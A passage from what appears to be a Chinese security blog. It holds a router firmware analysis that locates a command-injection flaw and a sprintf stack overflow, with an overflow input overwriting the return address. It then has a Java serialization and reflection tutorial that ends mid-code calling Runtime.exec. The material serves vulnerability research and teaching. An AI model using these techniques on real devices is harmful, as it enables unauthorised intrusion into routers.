src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422094858896.png" alt="image-20220422094858896"></p><p>此时v0值为0，改为1跳过</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422095038420.png" alt="image-20220422095038420"></p><h2 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h2><p>这里陷入个死循环，问题点在</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422101918935.png" alt="image-20220422101918935"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422102003495.png" alt="image-20220422102003495"></p><p>也尝试更改寄存器v0的值成功绕过。</p><h2 id="问题3"><a href="#问题3" class="headerlink" title="问题3"></a>问题3</h2><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422095242595.png" alt="image-20220422095242595"></p><p>继续string大法</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422095310053.png" alt="image-20220422095310053"></p><p>抱歉这里我并没有查到这个函数的是干什么的，有清楚的请告诉我，提前感谢。</p><p>不影响，改寄存器大法。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422095958809.png" alt="image-20220422095958809"></p><h2 id="问题4"><a href="#问题4" class="headerlink" title="问题4"></a>问题4</h2><p>上面没问题之后发现ip开在<code>255.255.255.255</code>上。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422102645100.png" alt="image-20220422102645100"></p><p>string大法搜 listen ip</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422103034994.png" alt="image-20220422103034994"></p><p><code>inet_ntoa</code>函数的意思是，功能是将网络地址转换成“.”点隔的字符串格式。</p><p>所以跟sockaddr.sin_port有关，查看引用</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422103359077.png" alt="image-20220422103359077"></p><p><code>inte_addr</code> 功能是将一个点分十进制的IP转换成一个长整型数（u_long类型）等同于<em>inet_addr</em>()。</p><p>与host有关，再向前查看</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422103859404.png" alt="image-20220422103859404"></p><p>其参数为全局变量 g_lan_ip。设置个lanip</p><blockquote><p>sudo tunctl -t br0 -u ‘用户名’</p><p>sudo ifconfig br0 192.168.5.1&#x2F;24</p></blockquote><p> ps eth1就是第二块网卡第一块通常是eth<em>0</em> <em>tap</em>是虚拟网络接口 <em>br</em>是网桥</p><p>这个设置完之后问题2直接解决了。</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422110341615.png" alt="image-20220422110341615"></p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422110418896.png" alt="image-20220422110418896"></p><h1 id="分析思路"><a href="#分析思路" class="headerlink" title="分析思路"></a>分析思路</h1><p>分析其使用的web服务器，常见的嵌入式有以下几种：httpd，uhttpd，gohead，lighttpd，boa</p><p>还有其他的，我没咋见过，就不写了，用到的话自行查阅（懒！）</p><p>我分析这款使用的是httpd，在bin目录下，一般服务器文件都在一下几个目录，不排除其他目录</p><div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/user/</span>bin/<span class="hljs-regexp">/user/</span>sbin/<span class="hljs-regexp">/bin/</span></code></pre></div><p>在逆向分析httpd时，尽量关注一些自定义功能代码，main下调用的initwebs函数中，配置了前端访问方式</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422112301584.png" alt="image-20220422112301584"></p><p>可以看到默认页面main，</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422112355613.png" alt="image-20220422112355613"></p><p><code>websSetPassword</code>设置访问口令，不多说各位调试的时候可以关注一下。</p><p><code>websUrlHandlerDefine</code>需要关注，这个函数的意思是什么样的url交给谁处理。</p><p>上面说了<code>尽量关注一些自定义功能代码</code></p><p>这里的自定义功能代码就在<code>formDefineTendDa</code>中</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422113423088.png" alt="image-20220422113423088"></p><p>上面这些都是通过<code>goform</code>来处理的，所以其访问形式为 <a href="http://127.0.0.1/goform/TendaGetLongString%E8%BF%99%E6%A0%B7%E7%9A%84">http://127.0.0.1:80/goform/TendaGetLongString这样的</a></p><p>哪个路径就交由哪个函数来处理。</p><p>下面分析可以由两方面展开：</p><p>分析各个功能点</p><blockquote><p> 简单来说就是将所有接口的代码过一遍，去分析参数从哪里来，有没有经过什么危险函数</p></blockquote><p>这种的话效率比较低，我个人推荐第二种</p><p>通过危险函数来查找可利用点，利用逆向分析工具的交叉编译功能查找</p><p>这里放一张危险函数表</p><p>dosystemcmd</p><p>system</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/0B814D68-9F2F-437C-A067-BB97942160E8.png">根据上面的函数表来将危险函数过一下</p><p>下面是之前分析到的两个问题的思路，住这里不涉及exp，poc等脚本的编写，还是以思路为主。</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>过一遍dosystemcmd函数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422141922087.png" alt="image-20220422141922087"></p><p>可以看到有145次调用，感觉有漏洞的几率还是挺大的</p><p>注意点，尽量找form这类的函数，即上面说的自定义功能，有前后端交互</p><p>且危险函数的参数来自于前端参数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220422142703774.png" alt="image-20220422142703774"></p><p><code>websGetVar</code>就是从wp中获取其第二个参数对应的值，如果没有该参数，值默认为第三个参数。</p><p>上面可以看到这里pcVar1未作任何处理直接拼接到参数中。</p><p>这里就产生了命令执行，不多做赘述，各位有兴趣可自行复现。</p><h2 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h2><p>溢出是在strpintf函数的调用中发现的。</p><p>goform&#x2F;NatStaticSetting路径访问到fromNatStaticSetting函数</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/wpsnHFtW8.jpg" alt="img"> </p><p>sprintf函数将page的参数给拼接到字符串中，未做长度校验，导致溢出</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/wpsOGISIR.jpg" alt="img"> </p><p>复现过程：</p><p>断点到fromNatStaticSetting函数入口</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/wps0paJou.jpg" alt="img"> </p><p>将调用fromNatStaticSetting函数的返回地址放入0x407FFAE4    处</p><p>向下执行到第三个websGetVar函数获取page参数，然后向下执行sprintf函数，将page参数的内容拼接到gotopage内，由代码可知长度为256</p><p>参数初始化完毕后发现gotopage位置为0x407FF9E0</p><p>这里我们传入page参数为：</p><div class="code-wrapper"><pre><code class="hljs abnf"><span class="hljs-attribute">page</span><span class="hljs-operator">=</span>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaacAAAA</code></pre></div><p>执行完后</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/wpsi5rSOK.jpg" alt="img"> </p><p>返回地址0x407FFAE4已经被AAAA覆盖。</p><p>上面是一些思路之类的东西，第一个命令执行晚了几天。</p>]]></content>
    
    
    <categories>
      
      <category>iot</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>java序列化与反序列化</title>
    <link href="/article/335a6663.html"/>
    <url>/article/335a6663.html</url>
    
    <content type="html"><![CDATA[<p>java序列化指的是将java对象转化为字节序列的过程<br>java反序列化指字节序列恢复到java对象</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><blockquote><p>计算机内存最小单位为一个二进制位，即 0或1<br>我们吧这个二进制位称为一个bit（比特）位</p><p>一个字节（byte）有八个比特位，即 byte &#x3D; 8*bit<br>如果八个bit位都为1，即这个字节最大为 FF &#x3D; 1111 1111</p><p>一个字（word）是两个byte，即 word &#x3D; 2 * byte &#x3D; 16 * bit<br>则一个字最大为 FFFF </p><p>doubleword 双字，是两个word ，即四个byte，32*bit<br>一个doubleword为FFFF FFFF</p><p>一般情况下使用最多的是字节，字节相当于人民币的元一样，虽然不是最低的，但却是最常用的</p><p>一串字符在内存中一般是以ascii编码形式存在，不同编码占用子节长度不同</p><p>一个ascii码的占用一个字节</p><p>unicode码占用一个字（两个字节）<br>utf-8 是我们国内常用的是针对unicode码的一种可变编码方式。<br>ascii<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141904498.png" alt="image-20220402141904498">unicode<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141909806.png" alt="image-20220402141909806"><br>字节序<br>当一串数据太大的时候，一个字节放不下，就需要使用多个字节<br>比如0x12345678<br>就需要四个字节<br>而现在就有了两种存放方式<br>我们称这两种为 小端序和大端序<br>小端序从屁股开始，大端序从头开始<br>小端序<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141918940.png" alt="image-20220402141918940"><br>大端序<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141924848.png" alt="image-20220402141924848"><br>各家架构不同，使用的大小端序不同，无需纠结<br>但是后来计算机网络通信出来了，大家如果有不同的话会导致混乱<br>tcp&#x2F;ip协议出来之后就规定网络通信必须使用大端序<br>以上就是字节序的基本知识</p></blockquote><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p>序列化：</p><blockquote><p>对象序列化的最主要的用处就是在传递和保存对象的时候，保证对象的完整性和可传递性。序列化是把对象转换成有序字节流，以便在网络上传输或者保存在本地文件中。序列化后的字节流保存了Java对象的状态以及相关的描述信息。序列化机制的核心作用就是对象状态的保存与重建。</p></blockquote><p>反序列化：</p><blockquote><p>客户端从文件中或网络上获得序列化后的对象字节流后，根据字节流中所保存的对象状态及描述信息，通过反序列化重建对象。</p></blockquote><p>序列化就是把实体对象状态按照一定的格式写入到有序字节流，反序列化就是从有序字节流重建对象，恢复对象状态。</p><p>上面的简单点说，进程间通信可以将图片，视频，音频等信息用二进制方式传输。但是进程间的对象却不能这么搞。</p><blockquote><p>比如我创建了一个User u1 &#x3D; new User(1,”a”,100);<br>我要将它传给另一个软件（进程）<br>进程间的对象想要传输就需要序列化和反序列化<br>序列化为二进制数据，可以永久存在硬盘里，也可以进行网络传输</p></blockquote><h2 id="实现java序列化和反序列化"><a href="#实现java序列化和反序列化" class="headerlink" title="实现java序列化和反序列化"></a>实现java序列化和反序列化</h2><p>下面嫌太长了可以直接看例子</p><h3 id="JDK类库中序列化和反序列化API"><a href="#JDK类库中序列化和反序列化API" class="headerlink" title="JDK类库中序列化和反序列化API"></a>JDK类库中序列化和反序列化API</h3><p>java.io.ObjectOutputStream：</p><blockquote><p>表示对象输出流；<br>它的writeObject(Object obj)方法可以对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中；<br>java.io.ObjectInputStream：<br>表示对象输入流；它的readObject()方法源输入流中读取字节序列，再把它们反序列化成为一个对象，并将其返回；</p></blockquote><h3 id="实现序列化的要求"><a href="#实现序列化的要求" class="headerlink" title="实现序列化的要求"></a>实现序列化的要求</h3><blockquote><p>只有实现了Serializable或Externalizable接口的类的对象才能被序列化，否则抛出异常！</p></blockquote><h3 id="实现Java对象序列化与反序列化的方法"><a href="#实现Java对象序列化与反序列化的方法" class="headerlink" title="实现Java对象序列化与反序列化的方法"></a>实现Java对象序列化与反序列化的方法</h3><p>若User类仅仅实现了Serializable接口，则可以按照以下方式进行序列化和反序列化</p><blockquote><p>ObjectOutputStream采用默认的序列化方式，对User对象的非transient的实例变量进行序列化。<br>ObjcetInputStream采用默认的反序列化方式，对对User对象的非transient的实例变量进行反序列化。</p></blockquote><p>若User类仅仅实现了Serializable接口，并且还定义了readObject(ObjectInputStream in)和writeObject(ObjectOutputSteam out)，则采用以下方式进行序列化与反序列化。</p><blockquote><p>ObjectOutputStream调用User对象的writeObject(ObjectOutputStream out)的方法进行序列化。<br>ObjectInputStream会调用User对象的readObject(ObjectInputStream in)的方法进行反序列化。</p></blockquote><p>若User类实现了Externalnalizable接口，且User类必须实现readExternal(ObjectInput in)和writeExternal(ObjectOutput out)方法，则按照以下方式进行序列化与反序列化。</p><blockquote><p>ObjectOutputStream调用User对象的writeExternal(ObjectOutput out))的方法进行序列化。<br>ObjectInputStream会调用User对象的readExternal(ObjectInput in)的方法进行反序列化。</p></blockquote><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>user对象，使用的是上述第一种方式，所以User要实现Serializable</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> java.io.<span class="hljs-keyword">Serializable</span>;<span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> <span class="hljs-keyword">User</span> implements <span class="hljs-keyword">Serializable</span> &#123;    <span class="hljs-type">int</span> id;    String <span class="hljs-type">name</span>;    String phone;  #一些<span class="hljs-keyword">get</span> <span class="hljs-keyword">set</span> 构造参数，这里就不列举了&#125;</code></pre></div><p>序列化与反序列化</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">userDemo</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;        <span class="hljs-comment">//创建对象</span>        <span class="hljs-type">User</span> <span class="hljs-variable">u1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;AAAAAAA&quot;</span>,<span class="hljs-string">&quot;110&quot;</span>); <span class="hljs-comment">//被序列化的对象</span>        User u2; <span class="hljs-comment">//反序列化的对象</span>        <span class="hljs-comment">//序列化</span>        getSerial(u1);        <span class="hljs-comment">//反序列化</span>        u2 = backSerial();        System.out.println(u2.getName());    &#125;    <span class="hljs-comment">//序列化</span>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getSerial</span><span class="hljs-params">(User u1)</span> <span class="hljs-keyword">throws</span> IOException &#123;        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;obj.out&quot;</span>);        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);        oos.writeObject(u1);        oos.flush();        oos.close();    &#125;    <span class="hljs-comment">//反序列化</span>    <span class="hljs-keyword">static</span> User <span class="hljs-title function_">backSerial</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;obj.out&quot;</span>);        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);        <span class="hljs-type">User</span> <span class="hljs-variable">u1</span> <span class="hljs-operator">=</span> (User) ois.readObject();        <span class="hljs-keyword">return</span> u1;    &#125;&#125;</code></pre></div><h2 id="序列化底层分析"><a href="#序列化底层分析" class="headerlink" title="序列化底层分析"></a>序列化底层分析</h2><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141932582.png" alt="image-20220402141932582">ObjdectOutputStream对象的初始化</p><p><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141939840.png" alt="image-20220402141939840"></p><p>bout是数据输出流的底层<br>writeStreamHeader将文件头写入文件<br><img src="https://gitee.com/p1piyang/image/raw/master/CE553829-55BC-4109-B70B-1F616E881FD5.png" alt="CE553829-55BC-4109-B70B-1F616E881FD5"><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141946262.png" alt="image-20220402141946262">这里根据序列化的文件分析<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141953303.png" alt="image-20220402141953303">所以这里是写入文件头，表示声明使用序列化协议以及说明序列化版本<br>初始化完毕，文件存在且写入了文件头。<br>开始序列化写入文件<br>writeObject(u1);<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402141959955.png" alt="image-20220402141959955">向下调用write0ject0();<br>这个方法的内容比较长<br>重要点在意思是按照不同类型的方法去写入序列化数据，可以看上面<code>实现Java对象序列化与反序列化的方法</code><br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142009374.png" alt="image-20220402142009374">我们实例中实现了Serializable，所以执行writeOrdinaryObject方法<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142016424.png" alt="image-20220402142016424">bout.writeByte(TC_OBJECT);<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142025632.png" alt="image-20220402142025632"></p><p>写入了0x73<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142032838.png" alt="image-20220402142032838">调用 writeClassDesc(desc, false);<br>跟进<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142040520.png" alt="image-20220402142040520">这里isProxy是判断类是否是动态代理模式</p><blockquote><p>具体可以自行了解，我也不清楚<br>因为我们实例的类不是动态代理，所以跟进writeNonProxyDesc();<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142047197.png" alt="image-20220402142047197">先写入了描述符号0x72<img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142056003.png" alt="image-20220402142056003"><br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142102038.png" alt="image-20220402142102038">下面判断跟进两个参数一个为1，一个为2<br>跟进writeClassDescriptor(desc);<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142108822.png" alt="image-20220402142108822">和true执行同一个方法<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142117842.png" alt="image-20220402142117842">在开发中，我们经常会遇到要经过for循环来判断该循环体中是否包含或不包含某一元素，这个时候我们也常用一个boolean值来介入判断。而“|&#x3D;”可以轻松的让我们完成实现</p><p>boolean flag &#x3D; false; 在一个循环体中，flag |&#x3D; (c&#x3D;&#x3D;e);如果一直不相等，则flag一直为false,一旦有一个相等则为true；</p></blockquote><p>out.writeUTF(name);<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142126634.png" alt="image-20220402142126634"></p><p>写入类名<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142131744.png" alt="image-20220402142131744">out.writeLong(getSerialVersionUID());<br>写入序列化uid</p><p>再往下一堆if判断接口的实现方式，将标志位写入<br>out.writeByte(flags);<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142137832.png" alt="image-20220402142137832"></p><p>我们使用serializable，所以应该写入0x02<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142143947.png" alt="image-20220402142143947">所以从0x000B - 0x0013 都是序列化uid<br>然后调用writeShort写入两个字节的域长度（比如说有3个变量，就写入 00 03 )<br>实例中有三个参数<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142150620.png" alt="image-20220402142150620">接下来就是循环写入变量名和变量类型<br> 每轮循环:</p><blockquote><p>writeByte写入一个字节的变量类型;</p><p>writeUTF()写入变量名</p><p>判断是不是原始类型，即是不是对象</p><p>不是原始类型(基本类型)的话，就调用writeTypeString()<br>这个writeTypeString()，如果是字符串，就会调用writeString()</p><p>而这个writeString()往往是这样写的，字符串长度(不是大小)小于两个字节，就先写入一个字节的TC_STRING(16进制 74)，然后调用writeUTF()，写入一个signature，这好像跟jvm有关，最后一般写的是类似下面这串</p><p>74 00 12 4c 6a 61 76 61 2f 6c 61 6e 67 2f 53 74 72 69 6e 67 3b<br>“翻译”过来就是，字符串类型，占18个字节长度，变量名是 Ljava&#x2F;lang&#x2F;string;<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142157021.png" alt="image-20220402142157021">红色 id参数 int 类型<br>绿色 name 参数 string 因为 String是引用数据类型所以调用了writeTypeString() 写入了Ljava&#x2F;lang&#x2F;string;<br>黄色 phone 参数 string<br>这里第一次看有个疑问<br>phone参数也是string，但是他却没Ljava&#x2F;lang&#x2F;string;这一串<br>后边又增加一个string的参数，确定同一种引用数据类型只写入一次。</p></blockquote><p>循环执行完，返回到writeNonProxyDesc方法<br>写入结束标志位0x78<br>bout.writeByte(TC_ENDBLOCKDATA);<img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142203943.png" alt="image-20220402142203943"><br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142209296.png" alt="image-20220402142209296">准备开始写入序列化数据<br>回到writeOrdinaryObject()方法<br>writeSerialData(obj, desc);方法来写入序列化数据<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142215875.png" alt="image-20220402142215875">这里根据使用方式来判断，所以调用了 defaultWriteFields();<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142224431.png" alt="image-20220402142224431">第二个if是判断是否为基本数据类型，是的话就会直接写入序列化数据，<br>不是的话向下到for循环附近<br>获取变量数，然后循环调用writeObject0()；写入<br>循环结束，直到所有运行完成，回到主函数。<br>反序列化就不写了，反反过来推一遍就成。</p><h2 id="java反射机制"><a href="#java反射机制" class="headerlink" title="java反射机制"></a>java反射机制</h2><p>反射机制允许程序在运行期借助于Reflection API取得任何类的内部信息，并能直接操作任意类和对象的所有属性及方法。</p><p>要使用一个类，就要先把它加载到虚拟机中，在加载完类之后，堆内存的方法区中就产生了一个Class类型的对象（一个类只有一个class对象），这个对象就包含了完整的类的结构信息，我们可以通过这个对象看到类的结构，这个对象就像一面镜子，透过镜子可以看到类的结构，所以形象的称之为：反射。<br>实例：</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">a1Class</span> <span class="hljs-variable">a1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">a1Class</span>();        <span class="hljs-comment">//通过运行时的对象调用getClass();</span>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a1.getClass();        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-comment">//getMethod(方法名,参数类型)</span>            <span class="hljs-comment">//getMethod第一个参数是方法名，第二个参数是该方法的参数类型</span>            <span class="hljs-comment">//因为存在同方法名不同参数这种情况，所以只有同时指定方法名和参数类型才能唯一确定一个方法</span>            <span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> c.getMethod(<span class="hljs-string">&quot;print&quot;</span>, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);            <span class="hljs-comment">//相当于r1.print(1, 2);方法的反射操作是用m1对象来进行方法调用 和r1.print调用的效果完全相同</span>            <span class="hljs-comment">//使用r1调用m1获得的对象所声明的公开方法即print，并将int类型的1,2作为参数传入</span>            <span class="hljs-type">Object</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> m1.invoke(a1,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>);        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">a1Class</span> &#123;        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> &#123;            System.out.println(a + b);        &#125;    &#125;&#125;</code></pre></div><h3 id="尝试简化上面的代码"><a href="#尝试简化上面的代码" class="headerlink" title="尝试简化上面的代码"></a>尝试简化上面的代码</h3><p>创建另一个文件</p><div class="code-wrapper"><pre><code class="hljs csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">testMiao</span> &#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">maio</span>()</span>&#123;        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;miao!&quot;</span>);    &#125;&#125;</code></pre></div><p>使用反射来执行miao();</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">Object</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;testMiao&quot;</span>).getMethod(<span class="hljs-string">&quot;maio&quot;</span>).invoke(<span class="hljs-literal">null</span>);        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre></div><h3 id="尝试添加参数简化"><a href="#尝试添加参数简化" class="headerlink" title="尝试添加参数简化"></a>尝试添加参数简化</h3><div class="code-wrapper"><pre><code class="hljs typescript"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testMiao</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">maio</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> s</span>)&#123;        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">&quot;miao!&quot;</span>+s);    &#125;&#125;</code></pre></div><p>反射</p><div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> throws Exception </span>&#123;        <span class="hljs-keyword">try</span> &#123;            Class.forName(<span class="hljs-string">&quot;testMiao&quot;</span>).<span class="hljs-built_in">getMethod</span>(<span class="hljs-string">&quot;maio&quot;</span>, <span class="hljs-type">String</span>.<span class="hljs-keyword">class</span>).<span class="hljs-built_in">invoke</span>(Class.forName(<span class="hljs-string">&quot;testMiao&quot;</span>),<span class="hljs-string">&quot;aaa&quot;</span>);        &#125;<span class="hljs-built_in">catch</span> (Exception e)&#123;            e.<span class="hljs-built_in">printStackTrace</span>();        &#125;    &#125;&#125;</code></pre></div><h2 id="java执行命令"><a href="#java执行命令" class="headerlink" title="java执行命令"></a>java执行命令</h2><p>java中可以使用Runtime.getRuntime.exec();来执行系统命令<br>如：<br><img src="https://fastly.jsdelivr.net/gh/p1yang/image@main/image-20220402142235200.png" alt="image-20220402142235200">尝试使用反射来执行</p><div class="code-wrapper"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;exec&quot;</span>, String.<span class="hljs-params">class</span>)</span>.invoke(<span class="hljs-string">&quot;open /System/Applications/Calculator.app\n&quot;</span>);</code></pre></div><p>这样会报错，报错的信息：是对象不是声明类的实例<br>说明exec只能是通过getRuntime来执行</p><div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">String</span>[] args)</span> throws Exception </span>&#123;        Object o = Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).<span class="hljs-built_in">getMethod</span>(<span class="hljs-string">&quot;getRuntime&quot;</span>).<span class="hljs-built_in">invoke</span>(null);        Class.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).<span class="hljs-built_in">getMethod</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-type">String</span>.<span class="hljs-keyword">class</span>).<span class="hljs-built_in">invoke</span>(o,<span class="hljs-string">&quot;open /System/Applications/Calculator.app\n&quot;</span>);    